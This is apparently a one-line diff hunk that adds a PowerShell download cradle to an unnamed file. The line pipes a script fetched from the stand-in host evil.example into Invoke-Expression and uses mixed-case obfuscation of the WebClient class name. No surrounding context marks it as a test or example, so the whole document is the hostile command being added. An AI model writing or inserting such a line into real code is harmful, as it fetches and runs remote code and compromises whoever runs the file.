@@ -1,0 +1,1 @@
+IEX (New-Object "NeT.WeBClieNT").DownloadString("http://evil.example/x.ps1")
